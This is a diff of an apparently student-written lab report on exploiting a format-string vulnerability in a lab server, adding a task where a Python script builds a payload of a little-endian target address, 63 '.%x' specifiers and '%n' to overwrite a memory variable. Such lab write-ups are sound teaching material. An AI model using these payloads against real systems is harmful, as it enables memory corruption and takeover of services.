@@ -77,14 +77,49 @@ print("output criado")
 
 We initialize an empty byte string which hold the malicious payload, and the we add the payload itself.
 
-Starting with the Target Address, we convert it into a 4-byte sequence in litle endian order. Then we add the Padding, with the 63 ".%x" we used before (since we know the stack offset is 63) and finishing it with the ".%s", which will print the data located at the address it is pointing to (In this case, it's the 64th argument position in the stack, our Target Address).
+Starting with the target address, we convert it into a 4-byte sequence in litle endian order. Then we add the Padding, with the 63 ".%x" we used before (since we know the stack offset is 63) and finishing it with the ".%s", which will print the data located at the address it is pointing to (In this case, it's the 64th argument position in the stack, our target address).
 
 Then, the final payload is written to a file, in this case called task2.bin.
 
 ![2B-sent](Images/2Bsent.png)
 
-Using "cat", we sent the payload to the server, which resulted in this output:
+Using cat, we sent the payload to the server, which resulted in this output:
 
 ![2B-received](Images/2Breceived.png)
 
 The server displayed the "secret message" correctly, concluding task 2.B.
+
+### Task 3 - Modifying the Server Program’s Memory
+
+#### 3.A
+
+The goal here is to change the value of the server's target variable, located at 0x080e5068 to any other value.
+
+We used a logic similar to the one in 2.B, but instead of "%s" we used "%n", which will write the total length of the printed string into the address specified on the start of the input buffer (our target address), overwriting the original value.
+
+```py
+import sys
+
+target = 0x080e5068
+
+output = b""
+
+output += target.to_bytes(4, byteorder='little')
+
+output += b".%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n"
+
+with open("task3A.bin", "wb") as f:
+	f.write(output)
+
+print("output criado")
+```
+
+Following the same logic, the payload is written in task3A.bin.
+
+![3A-sent](Images/3Asent.png)
+
+We sent the file to server, receiving this output:
+
+![3A-received](Images/3Areceived.png)
+
+The target variable's value is now 0x0000012e, instead of the original value of 0x11223344.
